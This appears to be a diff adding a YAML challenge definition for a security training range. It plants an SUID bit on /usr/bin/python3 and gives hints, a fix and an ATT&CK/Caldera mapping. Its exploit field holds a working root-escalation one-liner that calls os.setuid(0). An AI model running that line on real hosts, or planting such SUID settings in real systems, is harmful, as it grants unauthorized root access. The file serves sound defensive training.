@@ -1,0 +1,33 @@
+id: suid_python
+name: SUID Bit on Python3
+description: The SUID bit is set on /usr/bin/python3, allowing any local user to execute Python with root effective UID. This is a trivial privilege escalation path — one Python line spawns a root shell.
+type: vulnerability
+difficulty: medium
+points: 200
+category: filesystem
+tags: [suid, permissions, privilege-escalation, python]
+conflicts: []
+requires: []
+script: suid_python.sh
+verification:
+  type: file_permissions
+  path: /usr/bin/python3
+  expected: "755"
+suggested_fix: "Remove the SUID bit from Python3: chmod u-s /usr/bin/python3 (or chmod 755 /usr/bin/python3)"
+hints:
+  - "Look for binaries with unusual SUID permissions"
+  - "Check for SUID bits on interpreters and scripting runtimes"
+  - "Remove the SUID bit: chmod 755 /usr/bin/python3"
+caldera:
+  tactic: privilege-escalation
+  technique:
+    attack_id: T1548.001
+    name: "Abuse Elevation Control Mechanism: Setuid and Setgid"
+  recon:
+    description: "Check if python3 has the SUID bit set"
+    command: |
+      test -u /usr/bin/python3 && echo "VULNERABLE: SUID bit set on /usr/bin/python3" || echo "SECURE: python3 has normal permissions"
+  exploit:
+    description: "Escalate to root via SUID python3"
+    command: |
+      /usr/bin/python3 -c "import os; os.setuid(0); os.system('id')"
